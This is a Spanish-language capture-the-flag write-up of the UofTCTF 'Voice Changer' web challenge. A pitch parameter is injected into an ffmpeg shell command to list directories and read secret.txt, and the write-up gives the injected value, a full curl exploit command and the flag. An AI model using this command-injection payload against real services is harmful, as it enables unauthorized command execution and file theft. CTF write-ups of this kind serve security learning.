# Tipo: Web Desafío: Voice Changer

![image](https://github.com/LauAria/CTFS-Writeups/assets/48163730/42c8eb57-8c12-4ebb-becf-c5c924b713f5)

En este desafío nos dan una página en la que se puede grabar un audio y enviarlo junto a otro parámetro el cual se usa para modificar dicho audio.

El resultado de subir un audio y submitearlo es el siguiente:

![image](https://github.com/LauAria/CTFS-Writeups/assets/48163730/0c9dbff8-0991-4ad4-bab7-12213948bcd6)

Abajo se puede ver la salida del comando ffmpeg. 

Por lo que lo siguiente que se nos ocurrió fue cambiar el tipo de input

![image](https://github.com/LauAria/CTFS-Writeups/assets/48163730/67d8d5e0-5e8a-42a5-9bd1-16fbfb5e204d)

Al hacer esto nos dimos cuenta que lo que se pone en el “Pitch” se inserta directamente en el medio del comando.

![image](https://github.com/LauAria/CTFS-Writeups/assets/48163730/0a87577d-f73c-42c3-b163-6e80733b4f1c)

Luego de esto intentamos comentar el resto del comando y usar un ls para ver donde estaba parado

![image](https://github.com/LauAria/CTFS-Writeups/assets/48163730/cf61c83e-7e4b-4a19-899e-4adcae4f5e81)

Luego probamos ir un nivel mas arriba

![image](https://github.com/LauAria/CTFS-Writeups/assets/48163730/103d474a-e52b-46cb-a440-5a00e1b21293)

y al hacer eso encontramos un archivo secret.txt y al imprimirlo encontramos la flag:
uoftctf{Y0UR Pitch IS 70O H!9H}

![image](https://github.com/LauAria/CTFS-Writeups/assets/48163730/27b43ef5-4097-4e6b-98fb-3e40c415c27a)

usando como input: " >/dev/null | cat ../secret.txt #

para finalizar esto se puede realizar con curl de la siguiente manera:
curl --location 'https://uoftctf-voice-changer.chals.io/upload' \
--form 'pitch="\" >/dev/null | cat ../secret.txt #"' \
--form 'input-file=@"audio.ogg"' -s | grep -o 'uoftctf{[^}]*}'

agregamos un grep al final para imprimir únicamente lo que coincida con el formato de la flag

![image](https://github.com/LauAria/CTFS-Writeups/assets/48163730/a4275fd2-5310-4ac1-ae53-79d944a5b3ea)
